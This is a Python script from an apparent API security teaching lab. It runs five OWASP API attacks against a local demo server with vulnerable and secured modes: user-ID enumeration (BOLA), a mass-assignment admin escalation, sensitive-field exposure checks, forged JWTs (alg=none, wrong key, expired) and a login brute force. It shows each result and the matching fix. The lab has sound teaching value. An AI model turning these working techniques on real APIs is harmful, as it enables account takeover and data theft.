"""
API Security Lab - Live Attack Demo
====================================
Runs all 5 OWASP attack demonstrations against the running demo app.
Shows vulnerable mode results then shows secured mode blocks them.

Usage:
    python demo/run_attacks.py [--url http://localhost:8000] [--mode vulnerable|secured|both]
"""
import argparse
import base64
import io
import json
import sys
import time

# Force UTF-8 output on Windows terminals
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.rule import Rule

console = Console(force_terminal=True, highlight=False)

BASE_URL = "http://localhost:8000"


def banner():
    console.print()
    console.print(Panel.fit(
        "[bold red]API Security Testing Lab[/bold red]\n"
        "[dim]OWASP API Top 10 - Live Attack Demonstrations[/dim]",
        border_style="red",
    ))
    console.print()


def section(title: str, owasp: str, color: str = "yellow"):
    console.print()
    console.print(Rule(f"[bold {color}]{title}[/bold {color}]  [dim]{owasp}[/dim]", style=color))
    console.print()


def get_token(url: str, username: str, password: str) -> str | None:
    try:
        r = httpx.post(f"{url}/auth/login", json={"username": username, "password": password}, timeout=5)
        if r.status_code == 200:
            return r.json()["access_token"]
    except Exception as e:
        console.print(f"[red]Login failed: {e}[/red]")
    return None


def check_mode(url: str) -> str:
    try:
        r = httpx.get(f"{url}/health", timeout=5)
        return r.json().get("mode", "unknown")
    except Exception:
        return "unknown"


# ══════════════════════════════════════════════════════════════════════════════
# Attack 1: BOLA — Broken Object Level Authorization (IDOR)
# ══════════════════════════════════════════════════════════════════════════════

def demo_bola(url: str):
    section("ATTACK 1: BOLA / IDOR", "API1:2023 Broken Object Level Authorization", "red")
    mode = check_mode(url)

    console.print(f"[bold]Mode:[/bold] [cyan]{mode.upper()}[/cyan]")
    console.print("[dim]User1 (authenticated) tries to access profiles of users 1–15 by guessing sequential IDs[/dim]")
    console.print()

    token = get_token(url, "user1", "password1")
    if not token:
        console.print("[red]Could not authenticate as user1[/red]")
        return

    table = Table(
        "User ID", "HTTP Status", "Username", "Email", "Password Hash Leaked?", "is_admin Leaked?",
        box=box.ROUNDED,
        title=f"BOLA Enumeration Results ({mode.upper()} mode)",
        title_style="bold",
        header_style="bold white on dark_blue",
    )

    leaked = 0
    blocked = 0
    for uid in range(1, 16):
        r = httpx.get(
            f"{url}/api/users/{uid}",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )
        if r.status_code == 200:
            data = r.json()
            has_hash = "password_hash" in data
            has_admin = "is_admin" in data
            hash_val = "[red]YES[/red]" if has_hash else "[green]NO[/green]"
            admin_val = "[red]YES[/red]" if has_admin else "[green]NO[/green]"
            status_color = "red" if uid != 1 else "green"
            table.add_row(
                str(uid),
                f"[{status_color}]200 OK[/{status_color}]",
                data.get("username", "-"),
                data.get("email", "-"),
                hash_val,
                admin_val,
            )
            leaked += 1
        elif r.status_code == 403:
            table.add_row(str(uid), "[green]403 Forbidden[/green]", "-", "-", "[green]NO[/green]", "[green]NO[/green]")
            blocked += 1
        else:
            table.add_row(str(uid), f"[yellow]{r.status_code}[/yellow]", "-", "-", "-", "-")

    console.print(table)
    console.print()

    if mode == "vulnerable":
        console.print(Panel(
            f"[red bold]VULNERABILITY CONFIRMED[/red bold]\n\n"
            f"[red][+] {leaked}/15 user profiles exposed to user1[/red]\n"
            f"[red][+] Sequential integer IDs enable complete user enumeration[/red]\n"
            f"[red][+] password_hash, is_admin, internal_id all leaked[/red]\n\n"
            f"[dim]Fix: Check ownership (user.id == current_user.id) before returning data[/dim]",
            title="BOLA Result", border_style="red",
        ))
    else:
        console.print(Panel(
            f"[green bold]ATTACK BLOCKED[/green bold]\n\n"
            f"[green][+] Only own profile accessible (1 response)[/green]\n"
            f"[green][+] {blocked} cross-user requests returned 403 Forbidden[/green]\n"
            f"[green][+] No sensitive fields in response[/green]",
            title="BOLA Result", border_style="green",
        ))


# ══════════════════════════════════════════════════════════════════════════════
# Attack 2: Mass Assignment — escalate to admin
# ══════════════════════════════════════════════════════════════════════════════

def demo_mass_assignment(url: str):
    section("ATTACK 2: MASS ASSIGNMENT", "API3:2023 Broken Object Property Level Authorization", "magenta")
    mode = check_mode(url)
    console.print(f"[bold]Mode:[/bold] [cyan]{mode.upper()}[/cyan]")
    console.print("[dim]Register a new user then send is_admin=true in the update payload[/dim]")
    console.print()

    # Register fresh user for this test
    ts = int(time.time()) % 100000
    username = f"attacker_{ts}"
    r = httpx.post(f"{url}/auth/register", json={"username": username, "password": "hacked123"}, timeout=5)
    if r.status_code not in (200, 201):
        console.print(f"[red]Register failed: {r.text}[/red]")
        return
    user_id = r.json()["id"]

    token = get_token(url, username, "hacked123")
    if not token:
        console.print("[red]Could not authenticate attacker[/red]")
        return

    # Check initial state
    before = httpx.get(
        f"{url}/api/users/{user_id}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=5,
    ).json()

    console.print("[bold]Before attack:[/bold]")
    console.print(f"  username = {before.get('username')}  is_admin = {before.get('is_admin', 'N/A')}")
    console.print()

    # Fire mass assignment payload
    payload = {
        "email": "hacked@evil.com",
        "is_admin": True,
        "role": "admin",
    }
    console.print(f"[bold]Sending payload:[/bold] {json.dumps(payload, indent=2)}")
    console.print()

    attack_r = httpx.put(
        f"{url}/api/users/{user_id}/update",
        json=payload,
        headers={"Authorization": f"Bearer {token}"},
        timeout=5,
    )

    table = Table("Field", "Sent", "Before", "After", box=box.SIMPLE_HEAVY, title="Mass Assignment Result")
    try:
        after = attack_r.json() if attack_r.content else {}
    except Exception:
        after = {}
    is_admin_after = str(after.get("is_admin_now", after.get("is_admin", "not exposed")))
    role_after = str(after.get("role_now", after.get("role", "not exposed")))
    table.add_row("is_admin", "true", str(before.get("is_admin", False)), is_admin_after)
    table.add_row("role", "admin", before.get("role", "-"), role_after)
    table.add_row("HTTP status", "-", "-", str(attack_r.status_code))
    console.print(table)
    console.print()

    if mode == "vulnerable":
        escalated = after.get("is_admin_now") is True
        console.print(Panel(
            f"[red bold]{'PRIVILEGE ESCALATION SUCCEEDED' if escalated else 'CHECK RESPONSE'}[/red bold]\n\n"
            f"[red][+] is_admin field accepted from user input[/red]\n"
            f"[red][+] Attacker gained admin privileges by sending is_admin=true[/red]\n\n"
            f"[dim]Fix: Use a strict Pydantic model (email + username only) — never bind raw dicts to ORM[/dim]",
            title="Mass Assignment Result", border_style="red",
        ))
    else:
        console.print(Panel(
            f"[green bold]ATTACK BLOCKED[/green bold]\n\n"
            f"[green][+] is_admin field silently ignored (not in allowed schema)[/green]\n"
            f"[green][+] role field silently ignored[/green]\n"
            f"[green][+] Only email/username fields are accepted[/green]",
            title="Mass Assignment Result", border_style="green",
        ))


# ══════════════════════════════════════════════════════════════════════════════
# Attack 3: Excessive Data Exposure
# ══════════════════════════════════════════════════════════════════════════════

def demo_data_exposure(url: str):
    section("ATTACK 3: EXCESSIVE DATA EXPOSURE", "API3:2023 / API2:2023", "yellow")
    mode = check_mode(url)
    console.print(f"[bold]Mode:[/bold] [cyan]{mode.upper()}[/cyan]")
    console.print("[dim]Checking which sensitive fields are returned in API responses[/dim]")
    console.print()

    token = get_token(url, "user1", "password1")
    if not token:
        console.print("[red]Could not authenticate[/red]")
        return

    # For products in secured mode we need the UUID; use the list to get it first
    products_r = httpx.get(f"{url}/api/products/", headers={"Authorization": f"Bearer {token}"}, timeout=5)
    first_product_id = "1"  # fallback for vulnerable mode (integer ID)
    if products_r.status_code == 200:
        prods = products_r.json()
        if prods:
            # secured mode returns uuid as id, vulnerable returns integer
            first_product_id = str(prods[0].get("id", "1"))

    endpoints = [
        (f"{url}/api/users/", "GET /api/users/"),
        (f"{url}/api/users/1", "GET /api/users/1"),
        (f"{url}/api/products/{first_product_id}", f"GET /api/products/{first_product_id[:8]}..."),
    ]

    sensitive_fields = ["password_hash", "internal_id", "is_admin", "login_count", "failed_login_count", "internal_cost"]

    table = Table("Endpoint", *sensitive_fields, box=box.ROUNDED, title=f"Sensitive Field Audit ({mode.upper()})", header_style="bold")

    for ep_url, label in endpoints:
        r = httpx.get(ep_url, headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code != 200:
            filler = [f"[yellow]{r.status_code}[/yellow]"] + ["-"] * (len(sensitive_fields) - 1)
            table.add_row(label, *filler)
            continue
        try:
            data = r.json() if r.content else {}
        except Exception:
            data = {}
        if isinstance(data, list):
            data = data[0] if data else {}

        def check_field(f):
            if f in data:
                val = str(data[f])[:20]
                return f"[red]EXPOSED: {val}[/red]"
            return "[green]hidden[/green]"

        table.add_row(label, *[check_field(f) for f in sensitive_fields])

    console.print(table)
    console.print()

    if mode == "vulnerable":
        console.print(Panel(
            "[red bold]DATA EXPOSURE CONFIRMED[/red bold]\n\n"
            "[red][+] password_hash exposed — allows offline cracking[/red]\n"
            "[red][+] internal_id exposed — UUID leaks internal architecture[/red]\n"
            "[red][+] is_admin exposed — allows privilege reconnaissance[/red]\n"
            "[red][+] internal_cost exposed — reveals business margin data[/red]\n\n"
            "[dim]Fix: Use separate response schemas (UserPublic, ProductPublic) — never return ORM objects directly[/dim]",
            title="Data Exposure Result", border_style="red",
        ))
    else:
        console.print(Panel(
            "[green bold]ATTACK BLOCKED[/green bold]\n\n"
            "[green][+] All sensitive fields stripped from responses[/green]\n"
            "[green][+] Response schema enforces field allowlist[/green]",
            title="Data Exposure Result", border_style="green",
        ))


# ══════════════════════════════════════════════════════════════════════════════
# Attack 4: Broken Authentication — JWT attacks
# ══════════════════════════════════════════════════════════════════════════════

def demo_jwt_attacks(url: str):
    section("ATTACK 4: BROKEN AUTHENTICATION — JWT Attacks", "API2:2023", "blue")
    mode = check_mode(url)
    console.print(f"[bold]Mode:[/bold] [cyan]{mode.upper()}[/cyan]")
    console.print()

    results = []

    # --- Attack 4a: None Algorithm ---
    console.print("[bold]4a. None-Algorithm Attack[/bold] [dim](strip signature, set alg=none)[/dim]")
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(b'{"sub":"14","role":"admin","is_admin":true}').rstrip(b"=").decode()
    none_token = f"{header}.{payload}."
    r = httpx.get(f"{url}/api/users/", headers={"Authorization": f"Bearer {none_token}"}, timeout=5)
    success = r.status_code == 200
    results.append(("none-alg", none_token[:40] + "...", r.status_code, success))
    status_str = "[red]ACCEPTED (vulnerable!)[/red]" if success else "[green]REJECTED (401)[/green]"
    console.print(f"  Token: {none_token[:60]}...")
    console.print(f"  Result: {status_str}")
    console.print()

    # --- Attack 4b: No expiry / tampered claims ---
    console.print("[bold]4b. Role Tampering[/bold] [dim](modify role claim without valid signature)[/dim]")
    import jose.jwt as jose_jwt
    tampered = jose_jwt.encode(
        {"sub": "1", "role": "admin", "is_admin": True},
        "wrong_secret_for_testing",
        algorithm="HS256",
    )
    r2 = httpx.get(f"{url}/api/users/", headers={"Authorization": f"Bearer {tampered}"}, timeout=5)
    success2 = r2.status_code == 200
    results.append(("role-tamper", tampered[:40] + "...", r2.status_code, success2))
    status_str2 = "[red]ACCEPTED (vulnerable!)[/red]" if success2 else "[green]REJECTED (401)[/green]"
    console.print(f"  Token: {tampered[:60]}...")
    console.print(f"  Result: {status_str2}")
    console.print()

    # --- Attack 4c: Expired token (only matters in secured mode) ---
    console.print("[bold]4c. Expired Token[/bold] [dim](exp claim set to past timestamp)[/dim]")
    import time as time_mod
    expired_payload = {"sub": "1", "role": "user", "exp": int(time_mod.time()) - 3600}
    expired_token = jose_jwt.encode(expired_payload, "secret", algorithm="HS256")
    r3 = httpx.get(f"{url}/api/users/", headers={"Authorization": f"Bearer {expired_token}"}, timeout=5)
    success3 = r3.status_code == 200
    results.append(("expired-token", expired_token[:40] + "...", r3.status_code, success3))
    status_str3 = "[red]ACCEPTED — no expiry check (vulnerable!)[/red]" if success3 else "[green]REJECTED (401)[/green]"
    console.print(f"  Token: {expired_token[:60]}...")
    console.print(f"  Result: {status_str3}")
    console.print()

    table = Table("Attack", "Token Preview", "Response", "Outcome", box=box.SIMPLE_HEAVY, title=f"JWT Attack Summary ({mode.upper()})")
    for attack, preview, status, succeeded in results:
        outcome = "[red]BYPASSED[/red]" if succeeded else "[green]BLOCKED[/green]"
        table.add_row(attack, preview[:30] + "...", str(status), outcome)
    console.print(table)
    console.print()

    if mode == "vulnerable":
        vuln_count = sum(1 for _, _, _, s in results if s)
        console.print(Panel(
            f"[red bold]{vuln_count}/3 JWT attacks succeeded[/red bold]\n\n"
            "[red][+] none-alg tokens accepted (no algorithm validation)[/red]\n"
            "[red][+] Expired tokens accepted (verify_exp=False)[/red]\n"
            "[red][+] Weak secret 'secret' enables offline brute force[/red]\n\n"
            "[dim]Fix: RS256 + strict validation (exp, iss, aud) + strong secret rotation[/dim]",
            title="JWT Attacks Result", border_style="red",
        ))
    else:
        console.print(Panel(
            "[green bold]JWT ATTACKS BLOCKED[/green bold]\n\n"
            "[green][+] none-alg rejected[/green]\n"
            "[green][+] Expired tokens rejected (exp enforced)[/green]\n"
            "[green][+] Tampered signatures rejected[/green]",
            title="JWT Attacks Result", border_style="green",
        ))


# ══════════════════════════════════════════════════════════════════════════════
# Attack 5: Rate Limiting (Brute Force)
# ══════════════════════════════════════════════════════════════════════════════

def demo_rate_limiting(url: str):
    section("ATTACK 5: LACK OF RATE LIMITING — Brute Force Login", "API4:2023", "cyan")
    mode = check_mode(url)
    console.print(f"[bold]Mode:[/bold] [cyan]{mode.upper()}[/cyan]")
    console.print("[dim]Sending 20 rapid POST /auth/login requests with wrong passwords[/dim]")
    console.print()

    table = Table("Attempt", "Password Tried", "Status", "Note", box=box.SIMPLE_HEAVY, title=f"Brute Force Results ({mode.upper()})")

    hit_429 = False
    first_429_at = None

    for i in range(1, 21):
        r = httpx.post(
            f"{url}/auth/login",
            json={"username": "user1", "password": f"wrong{i}"},
            timeout=5,
        )
        status = r.status_code
        note = ""
        color = "white"
        if status == 401:
            note = "Invalid credentials"
            color = "yellow"
        elif status == 429:
            if not hit_429:
                first_429_at = i
            hit_429 = True
            note = f"[green]RATE LIMITED — {r.headers.get('Retry-After', '?')}s[/green]"
            color = "green"

        table.add_row(str(i), f"wrong{i}", f"[{color}]{status}[/{color}]", note)

    console.print(table)
    console.print()

    if mode == "vulnerable":
        console.print(Panel(
            "[red bold]NO RATE LIMITING — BRUTE FORCE POSSIBLE[/red bold]\n\n"
            "[red][+] All 20 attempts returned 401 (not 429)[/red]\n"
            "[red][+] Attacker can try millions of passwords unimpeded[/red]\n"
            "[red][+] No lockout, no delay, no detection[/red]\n\n"
            "[dim]Fix: Redis sliding window — 5 attempts/minute per IP on /auth/login[/dim]",
            title="Rate Limiting Result", border_style="red",
        ))
    else:
        if hit_429:
            console.print(Panel(
                f"[green bold]BRUTE FORCE BLOCKED BY RATE LIMITER[/green bold]\n\n"
                f"[green][+] Rate limit triggered at attempt #{first_429_at}[/green]\n"
                f"[green][+] Returned 429 Too Many Requests with Retry-After header[/green]\n"
                f"[green][+] Sliding window prevents bypass at minute boundary[/green]",
                title="Rate Limiting Result", border_style="green",
            ))
        else:
            console.print(Panel(
                "[yellow]Rate limit not triggered in 20 attempts — limit may be higher than expected[/yellow]",
                title="Rate Limiting Result", border_style="yellow",
            ))


# ══════════════════════════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════════════════════════

def summary(url: str):
    console.print()
    mode = check_mode(url)
    console.print(Rule("[bold]DEMO SUMMARY[/bold]"))
    console.print()

    table = Table("OWASP ID", "Vulnerability", f"{mode.upper()} Mode", "CVSS", box=box.ROUNDED, title="OWASP API Security Top 10 — Lab Coverage")

    vulns = [
        ("API1:2023", "Broken Object Level Authorization (BOLA)", "VULNERABLE" if mode == "vulnerable" else "PROTECTED", "8.1 HIGH"),
        ("API2:2023", "Broken Authentication (JWT)", "VULNERABLE" if mode == "vulnerable" else "PROTECTED", "9.8 CRITICAL"),
        ("API3:2023", "Broken Object Property Level Auth (Mass Assignment)", "VULNERABLE" if mode == "vulnerable" else "PROTECTED", "7.5 HIGH"),
        ("API3:2023", "Excessive Data Exposure", "VULNERABLE" if mode == "vulnerable" else "PROTECTED", "7.5 HIGH"),
        ("API4:2023", "Unrestricted Resource Consumption (Rate Limiting)", "VULNERABLE" if mode == "vulnerable" else "PROTECTED", "7.5 HIGH"),
    ]

    for owasp_id, name, status, cvss in vulns:
        if status == "VULNERABLE":
            status_str = "[red bold]VULNERABLE[/red bold]"
        else:
            status_str = "[green bold]PROTECTED[/green bold]"
        table.add_row(owasp_id, name, status_str, cvss)

    console.print(table)
    console.print()

    if mode == "vulnerable":
        console.print(Panel(
            "[bold]Switch to secured mode to see all attacks blocked:[/bold]\n\n"
            "  [cyan]$env:APP_MODE = 'secured'[/cyan]\n"
            "  [cyan]uvicorn demo.demo_app:app --reload --port 8000[/cyan]\n\n"
            "Then rerun: [cyan]python demo/run_attacks.py[/cyan]",
            title="Next Step", border_style="cyan",
        ))
    else:
        console.print(Panel(
            "[green bold]All 5 OWASP vulnerabilities are protected in secured mode.[/green bold]\n\n"
            "Switch back to vulnerable mode to see the attacks succeed:\n\n"
            "  [cyan]$env:APP_MODE = 'vulnerable'[/cyan]\n"
            "  [cyan]uvicorn demo.demo_app:app --reload --port 8000[/cyan]",
            title="Secured Mode Active", border_style="green",
        ))


def main():
    parser = argparse.ArgumentParser(description="API Security Lab Attack Demo")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL of the demo app")
    parser.add_argument(
        "--attack",
        choices=["bola", "mass", "exposure", "jwt", "rate", "all"],
        default="all",
        help="Which attack to demonstrate",
    )
    args = parser.parse_args()
    global BASE_URL
    BASE_URL = args.url

    # Check server is up
    try:
        r = httpx.get(f"{args.url}/health", timeout=5)
        mode = r.json().get("mode", "unknown")
    except Exception:
        console.print(Panel(
            f"[red]Cannot connect to {args.url}[/red]\n\n"
            "Start the demo server first:\n"
            "  [cyan]uvicorn demo.demo_app:app --reload --port 8000[/cyan]",
            title="Server Not Running", border_style="red",
        ))
        sys.exit(1)

    banner()
    console.print(f"[bold]Target:[/bold] {args.url}   [bold]Mode:[/bold] [cyan]{mode.upper()}[/cyan]")

    if args.attack in ("bola", "all"):
        demo_bola(args.url)
    if args.attack in ("mass", "all"):
        demo_mass_assignment(args.url)
    if args.attack in ("exposure", "all"):
        demo_data_exposure(args.url)
    if args.attack in ("jwt", "all"):
        demo_jwt_attacks(args.url)
    if args.attack in ("rate", "all"):
        demo_rate_limiting(args.url)

    summary(args.url)


if __name__ == "__main__":
    main()
